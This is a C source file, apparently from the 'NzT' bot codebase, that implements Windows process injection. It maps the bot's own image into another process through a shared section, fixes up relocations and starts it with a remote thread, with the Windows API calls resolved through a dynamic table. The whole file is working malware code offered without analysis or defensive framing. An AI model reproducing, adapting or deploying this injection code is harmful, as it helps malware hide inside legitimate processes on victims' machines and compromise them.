#include <Windows.h>

#include "nzt.h"
#include "utils.h"

LPVOID GetImageBase(LPVOID ProcessAddress)
{
	LPBYTE Address = (LPBYTE)ProcessAddress;
	Address = (LPBYTE)((SIZE_T)Address & 0xFFFFFFFFFFFF0000);

	for (;;)
	{
		PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Address;
		if (DosHeader->e_magic == IMAGE_DOS_SIGNATURE)
		{
			if (DosHeader->e_lfanew < 0x1000)
			{
				PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)&((unsigned char*)Address)[DosHeader->e_lfanew];
				if (NtHeaders->Signature == IMAGE_NT_SIGNATURE)
					break;
			}
		}

		Address -= 0x1000;
	}

	return Address;
}


VOID ProcessRelocation(PIMAGE_BASE_RELOCATION Relocation, DWORD ImageBase, DWORD Delta, DWORD Size)
{
	PIMAGE_FIXUP_ENTRY Fixup;
	DWORD PointerRva;
	PIMAGE_BASE_RELOCATION LocalRelocation = Relocation;

	while ((DWORD)LocalRelocation - (DWORD)Relocation < Size)
	{
		if (!LocalRelocation->SizeOfBlock)
			break;

		Fixup = (PIMAGE_FIXUP_ENTRY)((ULONG)LocalRelocation + sizeof(IMAGE_BASE_RELOCATION));
		for (ULONG r = 0; r < (LocalRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1; r++)
		{
			PointerRva = LocalRelocation->VirtualAddress + Fixup->Offset;
			if (Fixup->Type == IMAGE_REL_BASED_HIGHLOW)
				*(PULONG)((ULONG)ImageBase + PointerRva) += Delta;

			Fixup++;
		}

		LocalRelocation = (PIMAGE_BASE_RELOCATION)((ULONG)LocalRelocation + LocalRelocation->SizeOfBlock);
	}

	return;
}

LPVOID InjectData(
	HANDLE Process,
	LPVOID Data,
	DWORD Size
)
{
	LPVOID Address;

	if ((Address = NzT.Api.pVirtualAllocEx(Process, NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
		return NULL;

	if (!NzT.Api.pWriteProcessMemory(Process, Address, Data, Size, NULL))
	{
		NzT.Api.pVirtualFreeEx(Process, Address, Size, MEM_RELEASE);
		return NULL;
	}

	return Address;
}

DWORD InjectCode(
	HANDLE Process,
	LPVOID Function
)
{
	HANDLE				Map, RemoteThread, Mutex, RemoteMutex;
	DWORD				Base, Size, ViewSize, NewBaseAddress, Address, ProcessId;
	LPVOID				View;
	NTSTATUS			Status;
	PIMAGE_DOS_HEADER	DosHeader;
	PIMAGE_NT_HEADERS	NtHeaders;
	ULONG				RelativeRva, RelativeSize;

	do
	{
		Map				= 0;
		RemoteThread	= 0;
		View			= NULL;
		Mutex			= 0;
		RemoteMutex		= 0;

		if ((ProcessId = GetProcessIdByHandle(Process)) == -1)
			break;

		if ((Mutex = CreateMutexOfProcess(ProcessId)) == 0)
			break;

		if (!API(DuplicateHandle)(API(GetCurrentProcess)(), Mutex, Process, &RemoteMutex, 0, FALSE, DUPLICATE_SAME_ACCESS))
			break;

		Base = (DWORD)GetImageBase(Function);
		Size = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((PBYTE)(Base)+((PIMAGE_DOS_HEADER)
			(Base))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

		if ((Map = API(CreateFileMappingW)(NzT.Api.pGetCurrentProcess()
			, NULL, PAGE_EXECUTE_READWRITE, 0, Size, NULL)) == 0)
			break;

		if ((View = API(MapViewOfFile)(Map, FILE_MAP_WRITE, 0, 0, 0)) == NULL)
			break;

		MemoryCopy(View, (LPVOID)Base, Size);

		ViewSize = 0;
		NewBaseAddress = 0;

		if ((Status = (NTSTATUS)API(NtMapViewOfSection)(Map, Process, (PVOID*)&NewBaseAddress, 0, Size,
			NULL, &ViewSize, (SECTION_INHERIT)1, 0, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
			break;

		DosHeader = (PIMAGE_DOS_HEADER)Base;
		NtHeaders = NtHeaders = (PIMAGE_NT_HEADERS)RVATOVA(Base, DosHeader->e_lfanew);

		RelativeRva = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		RelativeSize = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocation((PIMAGE_BASE_RELOCATION)(Base + RelativeRva), (DWORD)View, NewBaseAddress - Base, RelativeSize);

		Address = (DWORD)Function - Base + NewBaseAddress;
	} while (FALSE);

	if (Mutex != 0)
		API(CloseHandle)(Mutex);

	if (Map != 0)
		API(CloseHandle)(Map);

	if (RemoteThread != 0)
		API(CloseHandle)(RemoteThread);

	if (View != NULL)
		API(UnmapViewOfFile)(View);

	return Address;
}

BOOL InjectBot(DWORD ProcessId, LPTHREAD_START_ROUTINE Thread)
{
	DWORD Address;
	HANDLE RemoteThread, Process;
	BOOL Injected = FALSE;

	if ((Process = NzT.Api.pOpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ |
		PROCESS_CREATE_THREAD |
		PROCESS_DUP_HANDLE
		, FALSE, ProcessId)) == 0)
		return FALSE;

	if ((Address = InjectCode(Process, Thread)) == 0)
		return FALSE;

	if ((RemoteThread = NzT.Api.pCreateRemoteThread(Process, NULL, 0, (LPTHREAD_START_ROUTINE)Address, NULL, 0, NULL)) != 0)
	{
		NzT.Api.pCloseHandle(RemoteThread);
		Injected = TRUE;
	}

	NzT.Api.pCloseHandle(Process);

	return Injected;
}